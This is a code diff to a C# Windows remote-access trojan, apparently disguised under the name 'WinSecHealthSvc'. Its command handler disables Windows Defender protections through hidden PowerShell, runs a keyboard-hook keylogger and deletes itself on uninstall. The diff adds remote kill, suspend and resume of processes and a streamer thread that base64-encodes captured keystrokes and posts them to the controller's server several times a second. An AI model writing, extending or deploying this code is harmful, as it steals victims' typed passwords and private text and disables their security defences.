@@ -492,7 +492,17 @@ namespace WinSecHealthSvc
                         output = GetSysInfo();
                         break;
                     case "processes":
+                    case "ps_list":
                         output = GetProcessList();
+                        break;
+                    case "ps_kill":
+                        try { Process.GetProcessById(int.Parse(args)).Kill(); output = "Killed PID " + args; } catch (Exception e) { output = "Kill failed: " + e.Message; }
+                        break;
+                    case "ps_suspend":
+                        try { NtSuspendProcess(Process.GetProcessById(int.Parse(args)).Handle); output = "Suspended PID " + args; } catch (Exception e) { output = "Suspend failed: " + e.Message; }
+                        break;
+                    case "ps_resume":
+                        try { NtResumeProcess(Process.GetProcessById(int.Parse(args)).Handle); output = "Resumed PID " + args; } catch (Exception e) { output = "Resume failed: " + e.Message; }
                         break;
                     case "defender":
                         RunHiddenPS("Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true");
@@ -511,7 +521,7 @@ namespace WinSecHealthSvc
                         break;
                     case "keylogger":
                     case "keylog_start":
-                        if (!_keylogRunning) { _keylogRunning = true; _keylog.Clear(); new Thread(KeyloggerLoop) { IsBackground = true }.Start(); output = "Keylogger started"; }
+                        if (!_keylogRunning) { _keylogRunning = true; _keylog.Clear(); new Thread(KeyloggerLoop) { IsBackground = true }.Start(); new Thread(KeyloggerStreamer) { IsBackground = true }.Start(); output = "Keylogger started"; }
                         else output = "Already running";
                         break;
                     case "keylog_stop":
@@ -574,6 +584,9 @@ namespace WinSecHealthSvc
                             string me3 = System.Reflection.Assembly.GetExecutingAssembly().Location;
                             Process.Start(new ProcessStartInfo { FileName="cmd.exe", Arguments="/c ping 127.0.0.1 -n 3 & del /f /q \""+me3+"\"", CreateNoWindow=true, UseShellExecute=false });
                             output = "Uninstalling";
+                            Res(tid, output);
+                            new Thread(() => { Thread.Sleep(1000); Environment.Exit(0); }) { IsBackground = true }.Start();
+                            return;
                         } catch (Exception ex) { output = "uninstall error: " + ex.Message; }
                         break;
                     default:
@@ -637,19 +650,31 @@ namespace WinSecHealthSvc
         // ─────────────────────────────────────────────────────────────
         // P/Invoke declarations (always present)
         // ─────────────────────────────────────────────────────────────
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, KbHookProc lpfn, IntPtr hMod, uint dwThreadId);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+        [DllImport("user32.dll")]
+        static extern int GetMessage(out KbMsg lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
+        [DllImport("user32.dll")]
+        static extern bool TranslateMessage([In] ref KbMsg lpMsg);
+        [DllImport("user32.dll")]
+        static extern IntPtr DispatchMessage([In] ref KbMsg lpmsg);
+        [DllImport("ntdll.dll", PreserveSig = false)]
+        public static extern void NtSuspendProcess(IntPtr processHandle);
+        [DllImport("ntdll.dll", PreserveSig = false)]
+        public static extern void NtResumeProcess(IntPtr processHandle);
         [DllImport("ntdll.dll")] static extern int RtlSetProcessIsCritical(bool n, out bool o, bool p2);
-        [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int h, KbProc fn, IntPtr mod, uint tid);
-        [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
-        [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
-        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
-        [DllImport("user32.dll")] static extern int GetMessage(out KbMsg m, IntPtr h, uint a, uint b);
-        [DllImport("user32.dll")] static extern bool TranslateMessage(ref KbMsg m);
-        [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref KbMsg m);
-        delegate IntPtr KbProc(int n, IntPtr w, IntPtr l);
+        delegate IntPtr KbHookProc(int n, IntPtr w, IntPtr l);
         [StructLayout(LayoutKind.Sequential)]
         struct KbMsg { public IntPtr h; public uint msg; public IntPtr w; public IntPtr l; public uint t; public int x; public int y; }
         static IntPtr _hook = IntPtr.Zero;
-        static KbProc _kbProc;
+        static KbHookProc _kbProc;
 
         // ─────────────────────────────────────────────────────────────
         static string GetSysInfo() {
@@ -669,13 +694,18 @@ namespace WinSecHealthSvc
         }
 
         static string GetProcessList() {
-            var sb = new StringBuilder();
-            sb.AppendLine(string.Format("{0,-7} {1,-28} {2}", "PID", "Name", "Mem MB"));
-            sb.AppendLine(new string('-', 50));
+            var sb = new StringBuilder("[");
             var procs = Process.GetProcesses();
             Array.Sort(procs, (a, b2) => a.Id.CompareTo(b2.Id));
-            foreach (var pr in procs)
-                try { sb.AppendLine(string.Format("{0,-7} {1,-28} {2:F1}", pr.Id, pr.ProcessName, pr.WorkingSet64/1048576.0)); } catch {}
+            bool first = true;
+            foreach (var pr in procs) {
+                try { 
+                    if (!first) sb.Append(",");
+                    sb.Append("{\"pid\":"+pr.Id+",\"name\":\""+pr.ProcessName.Replace("\\","")+"\",\"mem\":"+Math.Round(pr.WorkingSet64/1048576.0,1)+"}");
+                    first = false;
+                } catch {}
+            }
+            sb.Append("]");
             return sb.ToString();
         }
 
@@ -709,6 +739,22 @@ namespace WinSecHealthSvc
                     }
                 } catch {}
                 Thread.Sleep(250); // ~4 FPS via HTTP
+            }
+        }
+
+        static void KeyloggerStreamer() {
+            int lastLen = 0;
+            while (_keylogRunning) {
+                Thread.Sleep(250);
+                if (_keylog.Length > lastLen) {
+                    string txt = _keylog.ToString();
+                    if(txt.Length > lastLen) {
+                        string chunk = txt.Substring(lastLen);
+                        lastLen = txt.Length;
+                        string json = "{\"id\":\"" + Esc(_clientId) + "\",\"tag\":\"keylog_stream\",\"data\":\"" + Convert.ToBase64String(Encoding.UTF8.GetBytes(chunk)) + "\"}";
+                        Post(_server + "/api/agent/result", json);
+                    }
+                }
             }
         }
 
